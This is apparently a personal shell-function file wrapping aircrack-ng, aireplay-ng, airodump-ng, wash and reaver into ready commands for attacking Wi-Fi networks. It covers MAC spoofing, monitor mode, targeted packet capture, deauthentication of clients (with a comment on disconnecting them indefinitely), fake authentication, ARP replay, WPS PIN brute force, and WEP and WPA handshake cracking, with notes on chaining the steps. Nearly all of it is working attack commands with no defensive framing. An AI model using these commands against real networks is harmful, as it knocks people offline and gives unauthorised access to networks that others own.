# Cambiar mac
changemac(){
    interface=$1
    new_mac="00:$2"

    sudo ifconfig "${interface}" down &&
    sudo ifconfig "${interface}" hw ether ${new_mac} &&
    sudo ifconfig "${interface}" up
}

mon-mode(){
  # Change interface to monitor mode
  # To check mode use iwconfig
    interface=$1

    sudo ifconfig "${interface}" down &&
    sudo airmon-ng check kill &&
    sudo iwconfig "${interface}" mode monitor &&
    sudo ifconfig "${interface}" up
}

pac-snif(){
    # Packet Sniffing
    # Get useful info from nerby AP's
    interface=$1
    sudo airodump-ng "${interface}"
}

pac-snif5g(){
    # Packet sniffing in 5G band
    interface=$1
    sudo airodump-ng --band a "${interface}"
}

pac-snif52g(){
    # Packet sniffing in 5G and 2.4 band
    interface=$1
    sudo airodump-ng --band abg "${interface}"
}

target-pac-snif(){
  # Get packages from an specific client
  ap_bssid=$1
  channel=$2
  file=$3
  interface=$4

  sudo airodump-ng --bssid "${ap_bssid}" --channel "${channel}" --write "${file}" "${interface}" 
}

deauth-attack(){
  # Disconnect a device from the AP
  # Use large pac_quantity to disconnect client from indefinite time (1000000000)

  # In some cases this doesnt work unless you are running target-pac-snif in
  # other terminal

  pac_quantity=$1
  ap_bssid=$2
  client_bssid=$3
  interface=$4

  sudo aireplay-ng --deauth "${pac_quantity}" -a "${ap_bssid}" -c "${client_bssid}" "${interface}" 
}

wep-crack(){
  # First do target-pac-snif and use the generated file
  # The file must have enough data to crack the password
  # If there is not enough trafic you can use fake-auth-attack and then
  # fake-auth-attack in other terminal

  file=$1

  sudo aircrack-ng "${file}" 
}

fake-auth-attack(){
    # This is useful to asociate with the target AP
    # To get interface_bssid run ifconfig and is the first six octets of unspec
    # parameter. Just change "-" for ":"
    ap_bssid=$1
    interface_bssid=$2
    interface=$3

    sudo aireplay-ng --fakeauth 0 -a "${ap_bssid}" -h "${interface_bssid}" "${interface}" 
}

arp-attack(){
    # To get interface_bssid run ifconfig and is the first six octets of unspec
    # parameter. Just change "-" for ":"
    ap_bssid=$1
    interface_bssid=$2
    interface=$3

    sudo aireplay-ng --arpreplay -b "${ap_bssid}" -h "${interface_bssid}" "${interface}" 
}

wps-scout(){
    # This command gives us info about networks with wps enabled
    # If column lck is true then we can try wps attack
    interface=$1

    sudo wash --interface "${interface}" 
}

bruteforce-wps(){
    # To run this command we have to associate with the AP using
    # fake-auth-attackin another terminal

    ap_bssid=$1
    channel=$2
    interface=$3

    sudo reaver --bssid "${ap_bssid}" --channel "${channel}" --interface "${interface}" -vvv --no-associate
}

wpa-crack(){
  # Function_description
  # cap_file is obtained with target-pac-snif
  # To get the handshake we have to wait until a client connects to the AP.
  # We can wait or try a deauth-attack with a low package count (4)
  cap_file=$1
  wordlist=$2

  sudo aircrack-ng "${cap_file}" -w "${wordlist}" 
}
